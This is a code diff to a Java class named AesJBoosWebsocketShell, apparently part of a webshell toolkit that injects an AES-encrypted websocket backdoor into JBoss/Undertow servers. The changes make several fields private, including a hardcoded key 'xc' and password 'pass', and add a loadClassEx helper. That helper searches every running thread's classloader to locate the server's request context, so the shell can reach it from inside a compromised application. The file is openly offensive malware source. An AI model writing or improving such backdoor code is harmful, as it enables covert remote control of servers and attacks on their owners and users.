@@ -17,10 +17,10 @@ import java.util.HashSet;
 public class AesJBoosWebsocketShell extends Endpoint implements MessageHandler.Whole<ByteBuffer>{
     private static boolean initialized = false;
     private static final Object lock = new Object();
-    Class payload = null;
-    Session session = null;
-    String xc = "3c6e0b8a9c15224a";
-    String pass = "pass";
+    private Class payload = null;
+    private Session session = null;
+    private String xc = "3c6e0b8a9c15224a";
+    private String pass = "pass";
 
 
     static {
@@ -46,8 +46,7 @@ public class AesJBoosWebsocketShell extends Endpoint implements MessageHandler.W
 
     public static Object[] getContexts() throws Throwable {
         HashSet contexts = new HashSet();
-        ClassLoader loader = Thread.currentThread().getContextClassLoader();
-        Object servletRequestContext = loader.loadClass("io.undertow.servlet.handlers.ServletRequestContext").getMethod("current").invoke(null);
+        Object servletRequestContext = loadClassEx("io.undertow.servlet.handlers.ServletRequestContext").getMethod("current").invoke(null);
         Object currentServletContext= servletRequestContext.getClass().getMethod("getCurrentServletContext").invoke(servletRequestContext);
         contexts.add(currentServletContext);
         return contexts.toArray();
@@ -130,6 +129,40 @@ public class AesJBoosWebsocketShell extends Endpoint implements MessageHandler.W
 
         return field;
     }
+
+    static Class loadClassEx(String className) throws ClassNotFoundException{
+        try {
+            return Class.forName(className);
+        } catch (Throwable e) {
+            try {
+                return Class.forName(className, true, Thread.currentThread().getContextClassLoader());
+            } catch (Throwable ignored) {
+                try {
+                    Thread[] threads = new Thread[Thread.activeCount()];
+                    Thread.enumerate(threads);
+                    for (int i = 0; i < threads.length; i++) {
+                        Thread thread = threads[i];
+                        if (thread == null) {
+                            continue;
+                        }
+                        try {
+                            ClassLoader loader = thread.getContextClassLoader();
+                            return loader.loadClass(className);
+                        } catch (Throwable ignored2) {
+
+                        }
+
+                    }
+
+                } catch (Throwable ignored2) {
+
+                }
+            }
+
+        }
+        throw new ClassNotFoundException(className);
+    }
+
     public static Object getFieldValue(Object obj, String fieldName) throws Exception {
         Field f=null;
         if (obj instanceof Field){
